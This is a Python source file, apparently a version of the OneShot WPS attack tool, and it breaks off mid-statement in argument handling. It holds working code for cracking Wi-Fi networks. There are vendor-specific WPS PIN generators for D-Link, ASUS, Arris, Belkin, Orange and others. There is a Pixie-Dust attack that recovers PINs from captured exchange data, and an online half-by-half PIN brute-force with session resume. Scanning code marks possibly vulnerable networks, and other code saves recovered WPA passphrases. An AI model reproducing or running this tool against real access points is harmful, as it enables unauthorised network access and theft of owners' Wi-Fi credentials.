#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import pathlib
import time
from datetime import datetime
import collections
import statistics
from pathlib import Path
from typing import Dict
import csv
from functools import lru_cache

try:
    import nl80211_scan
except ImportError:
    nl80211_scan = None


class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other
        return self

    def __isub__(self, other):
        self.integer -= other
        return self

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __hash__(self):
        return hash(self.integer)

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', '').replace('-', '').replace('.', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


@lru_cache(maxsize=None)
def _arris_fib(n):
    """Fibonacci-like sequence used by the Arris PIN algorithm (cached)."""
    if n in (0, 1, 2):
        return 1
    return _arris_fib(n - 1) + _arris_fib(n - 2)


class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC_DB = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pin36': {'name': '36-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin36},
                      'pin40': {'name': '40-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin40},
                      'pin44': {'name': '44-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin44},
                      'pin48': {'name': '48-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin48},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      'pinEasybox': {'name': 'EasyBox', 'mode': self.ALGO_MAC, 'gen': self.pinEasybox},
                      'pinArris': {'name': 'Arris', 'mode': self.ALGO_MAC, 'gen': self.pinArris},
                      'pinTrendNet': {'name': 'TrendNet', 'mode': self.ALGO_MAC, 'gen': self.pinTrendNet},
                      # Algorithms needing extra input (handled specially in generate())
                      'pinFTE': {'name': 'FTE', 'mode': self.ALGO_MAC, 'gen': None, 'needs': 'ssid'},
                      'pinBelkin': {'name': 'Belkin', 'mode': self.ALGO_MAC, 'gen': None, 'needs': 'serial'},
                      'pinOrange': {'name': 'Orange', 'mode': self.ALGO_MAC, 'gen': None, 'needs': 'serial'},
                      # Static pin algos
                      'pinGeneric': {'name': 'Static', 'mode': self.ALGO_STATIC_DB,
                                     'gen': lambda mac: 1234567, 'static': []},
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''}}
        # Lazily-loaded (prefix, pin) pairs from pins.csv; loaded once on first use.
        self._pin_db = None

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac, ssid=None, serial=None):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        @ssid — network name (required by 'pinFTE')
        @serial — device serial (required by 'pinBelkin'/'pinOrange')
        Returns the WPS pin string value
        """
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        # Algorithms that need more than the MAC are handled here.
        if algo == 'pinFTE':
            return self.pinFTE(mac, ssid)
        if algo == 'pinBelkin':
            return self.pinBelkin(mac, serial)
        if algo == 'pinOrange':
            return self.pinOrange(mac, serial)
        pin = self.algos[algo]['gen'](mac)
        new_algos = {'pinEmpty', 'pinEasybox', 'pinArris', 'pinTrendNet'}
        if algo in new_algos:
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def _needs_met(self, algo, ssid, serial):
        """Whether an algorithm's extra input (SSID/serial) is available."""
        needs = self.algos[algo].get('needs')
        if needs == 'ssid':
            return bool(ssid) and len(ssid) >= 2
        if needs == 'serial':
            return bool(serial) and len(serial) >= 4
        return True

    def getSuggested(self, mac, ssid=None, serial=None):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            if not self._needs_met(ID, ssid, serial):
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC_DB:
                for pins_static in self.algos['pinGeneric']['static']:
                    if pins_static.isdigit():
                        new_item = {'name': 'Static PIN DB', 'pin': pins_static}
                        res.append(new_item)
            else:
                item['name'] = algo['name']
                item['pin'] = self.generate(ID, mac, ssid=ssid, serial=serial)
                res.append(item)
        self.algos['pinGeneric']['static'].clear()
        return res

    def getSuggestedList(self, mac, ssid=None, serial=None):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            if not self._needs_met(algo, ssid, serial):
                continue
            res.append(self.generate(algo, mac, ssid=ssid, serial=serial))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    @staticmethod
    def _load_pin_db():
        """Read pins.csv once into a list of (mac_prefix, pin) pairs."""
        path = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'pins.csv')
        db = []
        try:
            with open(path, newline='') as csvfile:
                for row in csv.reader(csvfile):
                    if len(row) >= 2 and row[1]:
                        db.append((row[1], row[0]))
        except FileNotFoundError:
            pass
        return db

    def append_from_pin_csv(self, mac):
        if self._pin_db is None:
            self._pin_db = self._load_pin_db()
        mac = mac.upper()
        for prefix, pin in self._pin_db:
            if mac.startswith(prefix):
                self.algos['pinGeneric']['static'].append(pin)

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        All the algos will be returned since they can work sometimes
        The static pins will be added only if they are included in the csv for that specific mac
        Returns the algo ID
        """
        self.append_from_pin_csv(mac)
        return list(self.algos)

    def pinTrendNet(self, bssid):
        try:
            last_3 = bssid.string.replace(':', '')[-6:]
            merge = last_3[4:] + last_3[2:4] + last_3[:2]
            string = int(merge, 16) % 10000000
            pin = 10 * string
            pin_with_checksum = pin + self.checksum(pin)
            return f"{pin_with_checksum:08d}"
        except ValueError:
            return "12345670"

    def pinEasybox(self, bssid):
        try:
            last_two = bssid.string.replace(':', '')[-4:]
            sn = int(last_two, 16)
            snstr = f"{sn:05d}"

            mac = [int(c, 16) for c in last_two]
            sn_digits = [int(c) for c in snstr[1:]]

            k1 = (sum(sn_digits[:2]) + sum(mac[2:])) % 16
            k2 = (sum(sn_digits[2:]) + sum(mac[:2])) % 16

            hpin = [
                k1 ^ sn_digits[3],
                k1 ^ sn_digits[2],
                k2 ^ mac[1],
                k2 ^ mac[2],
                mac[2] ^ sn_digits[3],
                mac[3] ^ sn_digits[2],
                k1 ^ sn_digits[1]
            ]

            hpin_str = ''.join(f"{x:X}" for x in hpin)
            hpinint = int(hpin_str, 16) % 10000000
            return f"{hpinint:07d}{self.checksum(hpinint)}"

        except ValueError:
            return "12345670"

    def pinArris(self, bssid):
        macs = bssid.string.split(":")
        array_macs = [int(mac, 16) for mac in macs]

        fibnum = []
        for i, mac in enumerate(array_macs):
            adjusted_mac = mac
            counter = 0

            if adjusted_mac > 30:
                while adjusted_mac > 31:
                    adjusted_mac -= 16
                    counter += 1

            if counter == 0 and adjusted_mac < 3:
                adjusted_mac = sum(array_macs) - adjusted_mac
                adjusted_mac &= 0xff
                adjusted_mac = (adjusted_mac % 28) + 3

            fibnum.append(_arris_fib(adjusted_mac) + (_arris_fib(counter) if counter else 0))

        fibsum = sum(fib * _arris_fib(i + 16) for i, fib in enumerate(fibnum)) + sum(array_macs)
        fibsum = (fibsum % 10000000 * 10) + self.checksum(fibsum)

        return f"{fibsum:08d}"

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pin36(self, mac):
        return mac.integer & 0xFFFFFFFFF

    def pin40(self, mac):
        return mac.integer & 0xFFFFFFFFFF

    def pin44(self, mac):
        return mac.integer & 0xFFFFFFFFFFF

    def pin48(self, mac):
        return mac.integer & 0xFFFFFFFFFFFF

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac.integer & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = (((b[0] + b[1]) % 10)
               + (((b[5] + b[0]) % 10) * 10)
               + (((b[4] + b[5]) % 10) * 100)
               + (((b[3] + b[4]) % 10) * 1000)
               + (((b[2] + b[3]) % 10) * 10000)
               + (((b[1] + b[2]) % 10) * 100000)
               + (((b[0] + b[1]) % 10) * 1000000))
        return pin

    @staticmethod
    def _hex_digit(ch):
        """Parse a single hex char, 0 on failure (matches the reference impl)."""
        try:
            return int(ch, 16)
        except ValueError:
            return 0

    def _with_checksum(self, pin):
        """7-digit PIN + WPS checksum as an 8-char string."""
        pin %= 10000000
        return '{:07d}{}'.format(pin, self.checksum(pin))

    def pinFTE(self, mac, ssid):
        """FTE/Jazztel: PIN from a MAC byte + the last two SSID characters (hex)."""
        if not ssid or len(ssid) < 2:
            return ''
        machex = mac.string.replace(':', '')
        try:
            val = int(machex[6:8] + ssid[-2:], 16)
        except ValueError:
            val = 1234567
        return self._with_checksum((val % 10000000) + 7)

    def pinBelkin(self, mac, serial):
        """Belkin: PIN derived from the device serial and the MAC."""
        if not serial or len(serial) < 4:
            return ''
        machex = mac.string.replace(':', '')
        s = [self._hex_digit(serial[-4 + i]) for i in range(4)]
        n = [self._hex_digit(machex[-4 + i]) for i in range(4)]
        k1 = (s[2] + s[3] + n[0] + n[1]) % 16
        k2 = (s[0] + s[1] + n[3] + n[2]) % 16
        pin = k1 ^ s[1]
        t1 = k1 ^ s[0]
        t2 = k2 ^ n[1]
        p1 = n[0] ^ s[1] ^ t1
        p2 = k2 ^ n[0] ^ t2
        p3 = k1 ^ s[2] ^ k2 ^ n[2]
        k1 ^= k2
        pin = (pin ^ k1) * 16
        pin = (pin ^ t1) * 16
        pin = (pin ^ p1) * 16
        pin = (pin ^ t2) * 16
        pin = (pin ^ p2) * 16
        pin = (pin ^ k1) * 16
        pin += p3
        return self._with_checksum(pin)   # reference's correction term is always 0 here

    @staticmethod
    def _last_two_bytes_wan(mac):
        """WAN-side last two bytes used by the Orange algorithm."""
        machex = mac.string.replace(':', '')
        if len(machex) < 12:
            return '0000'
        wimac = machex[8:12]
        if wimac == '0000':
            return 'fffe'
        if wimac == '0001':
            return 'ffff'
        last = int(wimac[3], 16) - 2
        return wimac[:3] + format(last & 0xFFFFFFFF, 'x')

    def pinOrange(self, mac, serial):
        """Orange: PIN derived from the device serial and a WAN-adjusted MAC."""
        if not serial or len(serial) < 4:
            return ''
        serial = serial[-4:]
        wan = self._last_two_bytes_wan(mac)
        shex = [self._hex_digit(serial[i]) for i in range(4)]
        wanhex = [self._hex_digit(wan[i]) for i in range(4)]
        k1s = format(shex[0] + shex[1] + wanhex[2] + wanhex[3], 'x')
        k2s = format(shex[2] + shex[3] + wanhex[0] + wanhex[1], 'x')
        k1 = self._hex_digit(k1s if len(k1s) < 2 else k1s[1])
        k2 = self._hex_digit(k2s if len(k2s) < 2 else k2s[1])
        parts = [format(shex[3] ^ k1, 'x'), format(shex[2] ^ k1, 'x'),
                 format(wanhex[1] ^ k2, 'x'), format(wanhex[2] ^ k2, 'x'),
                 format(shex[3] ^ wanhex[2], 'x'), format(shex[2] ^ wanhex[3], 'x'),
                 format(shex[1] ^ k1, 'x')]
        try:
            pin = int(''.join(parts), 16)
        except ValueError:
            pin = 1234567
        prepin = str(pin)
        if len(prepin) > 7:
            prepin = prepin[-7:]
        return self._with_checksum(int(prepin))


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)


class ConnectionStatus:
    def __init__(self):
        self.status = ''   # '' or GOT_PSK
        self.essid = ''
        self.wpa_psk = ''

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time))

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class Companion:
    """Main application part — drives the built-in native WPS engine."""

    def __init__(self, interface, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = f'{user_home}/.OneShot/reports/'
        for d in (self.sessions_dir, self.pixiewps_dir):
            if not os.path.exists(d):
                os.makedirs(d)

        self.generator = WPSpin()

    def __runPixiewps(self):
        """Recover the WPS PIN from the collected M1-M3 data (built-in cracker)."""
        print("[*] Running Pixie-Dust attack…")
        try:
            import pixie
            pin = pixie.recover_pin_hex(
                self.pixie_creds.pke, self.pixie_creds.pkr,
                self.pixie_creds.e_hash1, self.pixie_creds.e_hash2,
                self.pixie_creds.authkey, self.pixie_creds.e_nonce)
        except Exception as e:
            print('[!] Pixie-Dust error: {}'.format(e))
            return False
        if pin:
            print('[+] WPS pin recovered: {}'.format(pin))
            return pin
        print('[-] Pixie-Dust failed (AP not vulnerable to the supported modes)')
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print('[i] PIN saved in {}'.format(filename))

    def __prompt_wpspin(self, bssid, ssid=None, serial=None):
        pins = self.generator.getSuggested(bssid, ssid=ssid, serial=serial)
        if len(pins) > 1:
            print(f'PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinNo = input('Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except (ValueError, IndexError):
                    print('Invalid number')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            print('[i] The only probable PIN is selected:', pin['name'])
            pin = pin['pin']
        else:
            return None
        return pin

    def single_connection(self, bssid=None, ssid=None, pin=None, pixiemode=False, serial=None):
        """Pixie-Dust (-K) or a single PIN attempt, entirely via the native engine."""
        if pixiemode:
            self.__collect_pixie_native(bssid, ssid)
            if not self.pixie_creds.got_all():
                print('[!] Not enough data to run Pixie Dust attack')
                return False
            pixiedust_pin = self.__runPixiewps()
            if not pixiedust_pin:
                return False
            self.__savePin(bssid, pixiedust_pin)
            # Recover the PSK with the cracked PIN via the full native exchange.
            self.__native_full_connect(bssid, ssid, pixiedust_pin)
            return True
        if not pin:
            pin = self.__prompt_wpspin(bssid, ssid, serial) or '12345670'
        return self.__native_full_connect(bssid, ssid, pin)

    def __collect_pixie_native(self, bssid, ssid):
        """Collect the six Pixie-Dust values via the native engine (no wpa_supplicant)."""
        try:
            import wps_connect
        except ImportError:
            print('[!] Native engine unavailable (wps_connect.py missing)')
            return
        print('[*] Native engine: associating and running WPS exchange to M3…')
        try:
            data = wps_connect.WpsConnection(self.interface, bssid, ssid or '').pixie_dust()
        except Exception as e:
            print('[!] Native WPS exchange failed: {}'.format(e))
            return
        if not data:
            print('[!] Native engine did not collect enough WPS data')
            return
        self.pixie_creds.pke = data['pke']
        self.pixie_creds.pkr = data['pkr']
        self.pixie_creds.e_hash1 = data['e_hash1']
        self.pixie_creds.e_hash2 = data['e_hash2']
        self.pixie_creds.authkey = data['authkey']
        self.pixie_creds.e_nonce = data['e_nonce']

    def __native_full_connect(self, bssid, ssid, pin):
        """Full native WPS PIN exchange (M1..M7) to recover the PSK. No wpa_supplicant."""
        if not pin:
            print('[!] Native full connection requires a PIN')
            return False
        try:
            import wps_connect
        except ImportError:
            print('[!] Native engine unavailable (wps_connect.py missing)')
            return False
        print('[*] Native engine: running full WPS exchange (M1..M7) to recover the PSK…')
        try:
            cred = wps_connect.WpsConnection(self.interface, bssid, ssid or '').run(pin)
        except Exception as e:
            print('[!] Native WPS connection failed: {}'.format(e))
            return False
        if not cred or not cred.get('psk'):
            print('[-] Native engine did not recover a PSK (wrong PIN or unsupported AP)')
            return False
        essid = cred.get('ssid') or ssid or ''
        self.connection_status.status = 'GOT_PSK'
        self.connection_status.wpa_psk = cred['psk']
        self.connection_status.essid = essid
        self.__credentialPrint(pin, cred['psk'], essid)
        if self.save_result:
            self.__saveResult(bssid, essid, pin, cred['psk'])
        return True

    def __bf_first_half(self, conn, f_half, delay):
        checksum = self.generator.checksum
        fh = int(f_half)
        while fh < 10000:
            s = '%04d' % fh
            pin = s + '000' + str(checksum(int(s + '000')))
            print('[*] Trying first half {}…'.format(s))
            if conn.first_half_ok(pin):
                print('[+] First half found: {}'.format(s))
                self.bruteforce.mask = s
                return s
            fh += 1
            self.bruteforce.registerAttempt('%04d' % fh)
            self.bruteforce.mask = '%04d' % fh
            if delay:
                time.sleep(delay)
        print('[-] First half not found')
        return None

    def __bf_second_half(self, conn, f_half, s_start, delay):
        checksum = self.generator.checksum
        sh = int(s_start)
        while sh < 1000:
            s3 = '%03d' % sh
            pin = f_half + s3 + str(checksum(int(f_half + s3)))
            print('[*] Trying PIN {}…'.format(pin))
            cred = conn.run(pin)
            if cred and cred.get('psk'):
                return pin, cred
            sh += 1
            self.bruteforce.registerAttempt(f_half + '%03d' % sh)
            self.bruteforce.mask = f_half + '%03d' % sh
            if delay:
                time.sleep(delay)
        return None, None

    def smart_bruteforce(self, bssid, ssid=None, start_pin=None, delay=None, loop=False):
        """Online WPS PIN bruteforce via the native engine (half-by-half)."""
        try:
            import wps_connect
        except ImportError:
            print('[!] Native engine unavailable (wps_connect.py missing)')
            return
        conn = wps_connect.WpsConnection(self.interface, bssid, ssid or '')

        session = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
        if start_pin and len(start_pin) >= 4:
            mask = start_pin[:7]
        else:
            mask = '0000'
            try:
                with open(session, 'r') as file:
                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                        mask = file.readline().strip() or '0000'
            except FileNotFoundError:
                pass

        self.bruteforce = BruteforceStatus()
        self.bruteforce.mask = mask
        try:
            if len(mask) <= 4:
                f_half = self.__bf_first_half(conn, mask.zfill(4), delay)
                if not f_half:
                    return
                s_start = '000'
            else:
                f_half, s_start = mask[:4], mask[4:7]
            pin, cred = self.__bf_second_half(conn, f_half, s_start, delay)
            if pin:
                essid = cred.get('ssid') or ssid or ''
                self.__credentialPrint(pin, cred['psk'], essid)
                if self.save_result:
                    self.__saveResult(bssid, essid, pin, cred['psk'])
                try:
                    os.remove(session)
                except FileNotFoundError:
                    pass
            else:
                print('[-] PIN not found')
        except KeyboardInterrupt:
            print('\nAborting…')
            with open(session, 'w') as file:
                file.write(self.bruteforce.mask)
            print('[i] Session saved in {}'.format(session))
            if loop:
                raise


class WiFiScanner:
    """docstring for WiFiScanner"""
    def __init__(self, interface, vuln_list=None, reverse_scan=False):
        self.interface = interface
        self.vuln_list = vuln_list
        self.reverse_scan = reverse_scan
        # Load pins.csv MAC prefixes once instead of re-reading per network.
        self.vuln_prefixes = WPSpin._load_pin_db()

        reports_fname = str(pathlib.Path.home()) + '/.OneShot/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                # Skip header
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.stored = []

    def is_vuln_from_pin_db(self, mac):
        return any(mac.startswith(prefix) for prefix, _ in self.vuln_prefixes)

    def scan_networks(self) -> Dict[int, dict]:
        """Scan via the built-in nl80211 scanner, keep WPS networks, print a table."""
        if nl80211_scan is None:
            print('[!] Built-in scanner unavailable (nl80211_scan.py missing)')
            return False
        try:
            networks = nl80211_scan.scan(self.interface)
        except nl80211_scan.Nl80211Error as e:
            print('[!] Scan failed: {}'.format(e))
            return False

        # Filtering non-WPS networks
        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        # Sorting by signal level
        networks.sort(key=lambda x: x.get('Level', 0), reverse=True)

        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        # Printing scanning results as table
        def truncateStr(s, length, postfix='…'):
            """
            Truncate string with the specified length
            @s — input string
            @length — length of output string
            """
            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text, color=None):
            """Returns colored text"""
            if color:
                if color == 'green':
                    text = '\033[92m{}\033[00m'.format(text)
                elif color == 'red':
                    text = '\033[91m{}\033[00m'.format(text)
                elif color == 'yellow':
                    text = '\033[93m{}\033[00m'.format(text)
                else:
                    return text
            else:
                return text
            return text

        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('Possibly vulnerable', color='green'),
                colored('WPS locked', color='red'),
                colored('Already stored', color='yellow')
            ))
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))

        network_list_items = list(network_list.items())
        if self.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n})'
            model = '{} {}'.format(network['Model'], network['Model number'])
            essid = truncateStr(network.get('ESSID', 'UNKNOWN ESSID'), 25)
            deviceName = truncateStr(network['Device name'], 27)
            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
                number, network['BSSID'], essid,
                network['Security type'], network.get('Level', 0),
                deviceName, model
                )
            if (network['BSSID'],  network.get('ESSID', '')) in self.stored:
                print(colored(line, color='yellow'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            elif ((self.vuln_list and (model in self.vuln_list))
                  or self.is_vuln_from_pin_db(network['BSSID'])):
                print(colored(line, color='green'))
            else:
                print(line)

        return network_list

    def prompt_network(self) -> tuple:
        while True:
            networks = self.scan_networks()
            if not networks:
                print('[-] No WPS networks found.')
                return
            refresh = False
            while not refresh:
                try:
                    networkNo = input('Select target (press Enter to refresh): ')
                    if networkNo.lower() in ('r', '0', ''):
                        refresh = True   # re-scan in the outer loop
                    elif int(networkNo) in networks.keys():
                        net = networks[int(networkNo)]
                        essid = net.get('ESSID')
                        if essid is None:
                            return (net['BSSID'],)
                        return net['BSSID'], essid
                    else:
                        raise IndexError
                except (ValueError, IndexError):
                    print('Invalid number')


def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = ['ip', 'link', 'set', iface, action]
    try:
        res = subprocess.run(cmd, shell=False, stdout=sys.stdout, stderr=sys.stdout)
    except FileNotFoundError:
        sys.stderr.write("[!] Command 'ip' not found — install iproute2 (Termux: pkg install iproute2)\n")
        return False
    return res.returncode == 0


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='OneShotPin 0.0.2 (c) 2017 rofl0r, drygdryg and fulvius31',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
        )

    parser.add_argument(
        '-i', '--interface',
        type=str,
        required=True,
        help='Name of the interface to use'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID of the target AP'
        )
    parser.add_argument(
        '-s', '--ssid',
        type=str,
        help='SSID of the target AP'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Set the delay between pin attempts'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write credentials to the file on success'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='Down network interface when the work is finished'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        help='Use custom file with vulnerable devices list'
        )
    parser.add_argument(
        '-l', '--loop',
        action='store_true',
        help='Run in a loop'
        )
    parser.add_argument(
        '-r', '--reverse-scan',
        action='store_true',
        help='Reverse order of networks in the list of networks. Useful on small displays'
        )
    parser.add_argument(
        '--serial',
        type=str,
        help='Device serial number — enables the Belkin and Orange PIN algorithms'
        )
    parser.add_argument(
        '--mtk-wifi',
        action='store_true',
        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
             'Turn off Wi-Fi in the system settings before using this.'
        )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output'
        )

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if args.mtk_wifi:
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
